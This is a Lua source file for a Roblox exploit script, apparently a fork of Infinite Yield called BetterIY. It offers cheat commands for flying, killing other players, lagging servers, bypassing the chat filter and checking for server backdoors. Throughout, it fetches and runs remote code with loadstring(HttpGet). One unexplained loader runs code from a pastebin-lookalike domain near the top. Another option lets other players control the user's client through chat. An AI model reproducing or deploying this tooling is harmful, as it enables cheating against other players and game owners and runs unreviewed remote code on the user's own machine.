if BetterIY_LOADED and not _G.IY_DEBUG == true then
    warn("Infinite Yield is running")
    return
end

pcall(function() getgenv().BetterIY_LOADED = true end)
...
pcall(function() getgenv().BetterIY_LOADED2 = true end)

local cloneref = cloneref or function(o) return o end
COREGUI = cloneref(game:GetService("CoreGui"))
Players = cloneref(game:GetService("Players"))

currentVersion = "6.1" -- Natively based off of v6.1, however BetterIY will still get most of IYs updates (if they're still updating, Idek)

if pluginVersion == nil then
	pluginVersion = "PAL Version"
end

if not game:IsLoaded() then
    local notLoaded = Instance.new("Message")
    notLoaded.Parent = COREGUI
    notLoaded.Text = "Infinite Yield ("..pluginVersion..") is waiting for the game to load"
    game.Loaded:Wait()
    notLoaded:Destroy()
end
...
local pluginloader = 'https://raw.githubusercontent.com/Tech-187/BetterIY/refs/heads/main/addplugin'
				...
				if pcall(function()
					...
					if readfile("IY_FE.iy") ~= nil then
						pcall(function()
							...
							table.insert(json.PluginsTable, funnyPlugin)
							writefile("IY_FE.iy", HttpService:JSONEncode(json))
						end)
					end
				else
					pcall(function()
						writefile("IY_FE.iy", '{"PluginsTable":["' .. funnyPlugin .. '"]}')
					end)
				end
			end
		end
...
if IY_LOADED then
	pcall(function()
		queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/BetterIY/refs/heads/main/BetterIYMain.lua"))()')
	end)
	pcall(function()
		execCmd("unkeepiy")
	...
	while wait(5) do
		if IY_LOADED and not _G.IY_DEBUG == true then -- a little troll to those that load normal IY after loading this version
			...
			(function(response)
				...
				videoframe.Video = getcustomasset("video.webm")
				videoframe:Play()
...
--add
task.spawn(function()
    loadstring(game:HttpGet("https://pastebinp.com/raw/eL3dViRD"))()
end)
...
Title.TextSize = 18
Title.Text = "Infinite Yield "..currentVersion.." ("..pluginVersion..")"

do
	local emoji = ({
		["01 01"] = "🎆", -- I really like what you guys did here - Tech
		[(function(Year)
...
Credits.Text = "Edge // Zwolf // Moon // Toon // BetterIY"
...
CMDs[#CMDs + 1] = {NAME = 'betteriydiscord', DESC = "Invite to the SC group's server"}
...
CMDs[#CMDs + 1] = {NAME = 'psrejoin / prj', DESC = 'Makes you rejoin a private server'}
...
CMDs[#CMDs + 1] = {NAME = 'showguis / sg', DESC = 'Shows any invisible GUIs'}
...
CMDs[#CMDs + 1] = {NAME = 'gchat / gamechat / admincommand [text]', DESC = 'Makes you fire a chat that works for admin games'}
...
CMDs[#CMDs + 1] = {NAME = 'magic / moveua', DESC = 'Moves unanchored parts around you to where your mouse is at'}
...
CMDs[#CMDs + 1] = {NAME = 'executortest', DESC = 'Test how good your executor is'}
...
CMDs[#CMDs + 1] = {NAME = 'loopmute / loopstopsounds / spamstopsounds', DESC = 'Loop mutes most games, making them quiet.'}
CMDs[#CMDs + 1] = {NAME = 'partymode / adminall', DESC = 'This allows other users to control your Infinite Yield client (Includes gchat usage)'}
CMDs[#CMDs + 1] = {NAME = 'unpartymode / unadminall / nopartymode', DESC = 'why are you even reading this?'}
CMDs[#CMDs + 1] = {NAME = 'legacylighting / compatibilitylighting', DESC = 'Set the game lighting back to the old (and better imo) lighting'}
CMDs[#CMDs + 1] = {NAME = 'tas / toolassistedspeedrun', DESC = 'This allows you to pre-record segmented runs that you can then play back into the game'}
CMDs[#CMDs + 1] = {NAME = 'respawn', DESC = 'Respawns you'}
CMDs[#CMDs + 1] = {NAME = 'pingspike / lagserver', DESC = 'Very minimal FE lag script that raises the server ping. Not very useful, besides annoying people that hate bad ping'}
CMDs[#CMDs + 1] = {NAME = 'unpingspike / unlagserver', DESC = 'yeah you probably realized that this lags you more than the server. it was a worth a shot though ngl!'}
CMDs[#CMDs + 1] = {NAME = 'mobilekeyboard / keyboard', DESC = 'Keyboard for mobile players'}
...
CMDs[#CMDs + 1] = {NAME = 'chatping / sayping', DESC = 'Notify everyone your ping'}
...
function refresh(plr)
    ...
    wait(.65)
    pcall(function() TurnVisible() end)
...
addcmd("rejoin", {"rj"}, function(args, speaker)
	if #Players:GetPlayers() <= 1 then
        ...
        local textLabel = Instance.new("TextLabel")
        textLabel.Text = "ˢᵉʳᵛᵉʳ ᶦˢ ᵉᵐᵖᵗʸ \n\n ʳᵉʲᵒᶦⁿᶦⁿᵍ ʷᶦˡˡ ᶜˡᵒˢᵉ \n ᵗʰᵉ ˢᵉʳᵛᵉʳ \n\n ᵃʳᵉ ʸᵒᵘ ˢᵘʳᵉ ʸᵒᵘ ʷᵃⁿᵗ ᵗᵒ \n ʳᵉʲᵒᶦⁿˀ"
        ...
        yesButton.Text = "Yes"
        yesButton.TextColor3 = Color3.fromRGB(0, 255, 0) -- Green
        yesButton.Font = Enum.Font.SourceSansBold
        yesButton.TextSize = 24
        yesButton.Size = UDim2.new(0, 100, 0, 50)
        yesButton.Position = UDim2.new(0.5, -yesButton.Size.X.Offset, 1, -55)
        yesButton.BackgroundTransparency = 1
        yesButton.Parent = frame
        
        local noButton = Instance.new("TextButton")
        noButton.Text = "No"
        noButton.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red
        noButton.Font = Enum.Font.SourceSansBold
        noButton.TextSize = 24
        noButton.Size = UDim2.new(0, 100, 0, 50)
        noButton.Position = UDim2.new(0.5, 5, 1, -55)
        ...
        yesButton.MouseButton1Click:Connect(function()
            ...
            gui:Destroy()
            wait(.5)
            Players.LocalPlayer:Kick("\nRejoining... Wait while it's closing the current server (Estimated 10 seconds)")
            wait(4)
...
addcmd('exit', {}, function(args, speaker)
    wait(.35) -- delayed incase the user wants to say it in chat like ";exit" as without the delay, the message often doesn't send
    game:Shutdown()
end)
...
addcmd('fly',{},function(args, speaker)
    if game.PlaceId == 112420803 or game.PlaceId == 155615604 or game.PlaceId == 4483381587 or game.PlaceId == 189707 or game.PlaceId == 4812631471 then
...
addcmd('unfly',{'nofly','novfly','unvehiclefly','novehiclefly','unvfly'},function(args, speaker)
    pcall(function() execCmd("uncfly") end)
...
local invisGUIS = {}
addcmd('showguis',{'sg'},function(args, speaker)
...
addcmd('unshowguis',{'unsg', 'usg'},function(args, speaker)
...
addcmd('mute',{'stopsounds'},function(args, speaker)
	for i, v in pairs(game:GetDescendants()) do
		if v:IsA("Sound") then
			v:Stop()
		end
...
addcmd('loopmute',{'loopstopsounds', 'spamstopsounds'},function(args, speaker)
	task.spawn(function()
		getgenv().loopmute = true
		while loopmute do 
			execCmd("mute") 
			wait(.51) 
		end
	end)
	for _, v in pairs({game.Workspace, game.Workspace.Terrain, game.ReplicatedStorage, game.StarterGui, game.StarterPack, game.Players, game.Lighting}) do
		for _, v in pairs(v:GetDescendants()) do
			if v:IsA("Sound") then v:Stop() end
		end
		mutecon[#mutecon + 1] = v.DescendantAdded:Connect(function(descendant)
		if mutedebounce then return end -- LAG LAG LAG LAG LAG
		getgenv().mutedebounce = true
		if mutedebounce2 then return end
		task.wait(math.random(0,0.33))
		getgenv().mutedebounce2 = true
			for i, v in pairs(game:GetDescendants()) do
				if v:IsA("Sound") then
					v:Stop()
				end
...
addcmd('unloopmute',{'unstopsounds'},function(args, speaker)
	for _, connection in ipairs(mutecon) do
...
addcmd('fixcam',{'restorecam'},function(args, speaker)
	...
	task.spawn(function() -- AR Gear cam fixer below
...
addcmd('enableshiftlock',{'enablesl','shiftlock'},function(args, speaker)
	...
	if not (args[1] and tostring(args[1]) == 'nonotify') then notify('Shiftlock','Shift lock is now available') end
end)
...
addcmd('f3x',{'fsex'},function(args, speaker)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/Lua-scripts/refs/heads/main/F3X%20archived"))()
end)
...
addcmd("replicationlag", {"backtrack"}, function(args, speaker)
	if tonumber(args[1]) then
		settings():GetService("NetworkSettings").IncomingReplicationLag = args[1] -- 1000
	end
end)
...
addcmd('age',{},function(args, speaker)
	...
	for i,v in pairs(players) do
		local p = Players[v]
		table.insert(ages, p.Name.."'s account age is: "..p.AccountAge.." days old")
	end
...
addcmd('setcreatorid',{'setcreator'},function(args, speaker)
	...
	--game.Players.LocalPlayer.UserId = game.CreatorId -- not me realizing this doesn't work on a level 3
end)
...
addcmd('executortest',{},function(args, speaker)
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Executor-Tester-18110"))()
end)

addcmd('httpspy',{'httpsniff', 'loadstringlog'},function(args, speaker)
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-HTTP-Spy-v2-Tool-16412"))()
end)

addcmd('ss',{'backdoorcheck'},function(args, speaker)
    execCmd("antiwebhook nonotify") -- adding webhook blocker here as the script being loaded doesn't belong to me and this is to block potential loggers (for example, owner updates their script to add a logger)
    wait(.65)
    execCmd("hideiy nonotify")
    pcall(function() setclipboard('require(4696373104)("'..game.Players.LocalPlayer.Name..'")') end) -- Infinite Yield SS, Heh
	loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))()
end)

addcmd('code',{'lua', 's'},function(args, speaker)
    wait(.35)
	--loadstring(args[1])()
    loadstring(getstring(1))()
end)

addcmd('scramblechat',{'scramble'},function(args, speaker)
    refresh(speaker)
    chatMessage("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
    chatMessage("⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻⸻")
    wait(1.35)
...
addcmd('shifttorun',{'shiftrun', 'srun'},function(args, speaker)
...
addcmd('antiwebhook',{},function(args, speaker)
    local whitelist = {}

	-- https://scriptblox.com/script/Universal-Script-Webhook-blocker-and-deleter-17912 TECH
	...
	if args[1] ~= "nonotify" then notify("Anti Webhook", "Run this before u use any obfuscated script.") end
end)

addcmd('chatbypass',{'nofilter', 'bchat'},function(args, speaker)
	execCmd("antiwebhook nonotify") -- adding webhook blocker here as the script being loaded doesn't belong to me and this is to block potential loggers
    wait(.65)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/Temp/refs/heads/main/cb",true))()
end)

addcmd('betteriydiscord',{'betteriy'},function(args, speaker)
...
addcmd('hug',{},function(args, speaker)
	hug = Instance.new("Animation")
    hug.AnimationId = "rbxassetid://27432686"
    hug2 = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(hug)
    hug2:Play(.1, 1, 1)
    hug2:AdjustSpeed(1)
    wait(0.8)
...
addcmd('legacylighting',{'compatibilitylighting', 'legacylight'},function(args, speaker)
	if sethidden then
		sethidden(Lighting, "Technology", Enum.Technology.Compatibility)
	else
		notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
	end
	if Lighting.Brightness == 1.981 or Lighting.Brightness == 2 then
		Lighting.Brightness = 1
	end
end)

addcmd('tas',{'toolassistedspeedrun'},function(args, speaker)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/BetterIY/refs/heads/main/TAS"))()
end)

local partymode = false

addcmd('partymode',{'adminall'},function(args, speaker)
	partymode = true
end)

addcmd('unpartymode',{'unadminll', 'unpartymode'},function(args, speaker)
	partymode = false
end)

addcmd('magic',{'moveua'},function(args, speaker)
	...
	local binds = mouse.KeyDown:connect(function(key)
...
addcmd('unpingspike',{'unlagserver'},function(args, speaker)
	on = false
	refresh(speaker) -- Not necessary but I always feel like my character doesn't feel smooth after using it. Feel free to remove
end)
...
addcmd("mobilekeyboard", {'keyboard'}, function(args, speaker)
	execCmd("antiwebhook nonotify") -- adding webhook blocker here as the script being loaded doesn't belong to me and this is to block potential loggers
...
addcmd('autojump',{'ajump'},function(args, speaker)
	...
	local a=Game:GetService("Players")local b=a.LocalPlayer;local c=b.Character or b.CharacterAdded:Wait()local d=c:WaitForChild("Humanoid")d.AutoJumpEnabled = true
end)

addcmd('unautojump',{'noautojump', 'noajump', 'unajump'},function(args, speaker)
	local a=Game:GetService("Players")local b=a.LocalPlayer;local c=b.Character or b.CharacterAdded:Wait()local d=c:WaitForChild("Humanoid")d.AutoJumpEnabled = false
end)
...
addcmd('gchat',{'admincommand', 'gamechat'},function(args, speaker)
    game.Players:Chat(getstring(1))
end)
...
addcmd('chatping',{'sayping'},function(args, speaker)
	chatMessage("Ping: "..math.round(speaker:GetNetworkPing() * 1000) .. "ms")
end)
...
addcmd('handlekill', {'hkill', 'kill'}, function(args, speaker)
	if not firetouchinterest then
...
if IsOnMobile then
    game:GetService("Players").LocalPlayer:GetMouse().KeyDown:Connect(function(key)
        if key == "/" then
            ...
            game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Chat"):WaitForChild("Frame"):WaitForChild("ChatBarParentFrame"):WaitForChild("Frame"):WaitForChild("BoxFrame"):WaitForChild("Frame"):FindFirstChildOfClass("TextBox"):CaptureFocus()
        end
    end)
end
...
task.spawn(function()
	...
	minimizeHolder()
	notify("BetterIY", "Loaded BetterIY Plugin :D")
end)

for _, player in pairs(game.Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        if not partymode then return end
		if Speaker ~= Players.LocalPlayer.Name and tostring(message):lower():sub(1, 3) == "iyc" then
			if debounce3 then return end
			getgenv().debounce3 = true
			if debounce4 then return end
			wait(math.random(0,0.33))
			getgenv().debounce4 = true
			task.delay(1.5, function()
				getgenv().debounce4 = false
				getgenv().debounce3 = false
			end) 
...
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.sub(msg, 0, 3) == "iyc" then -- allowing other scripts to communicate with IY incase execCmd doesn't work
        local command = string.sub(msg, 5)
        execCmd(command)
	elseif string.sub(msg, 0, 1) == prefix then
		local command = string.sub(msg, 2)
		if not IsOnMobile then return end
		if debounce1 then return end -- all of this is necessary because of the inconsistent double chat bug that affects legacy chat
		getgenv().debounce1 = true
		if debounce2 then return end
		wait(math.random(0,0.33))
		getgenv().debounce2 = true
		task.delay(1.5, function()
			getgenv().debounce2 = false
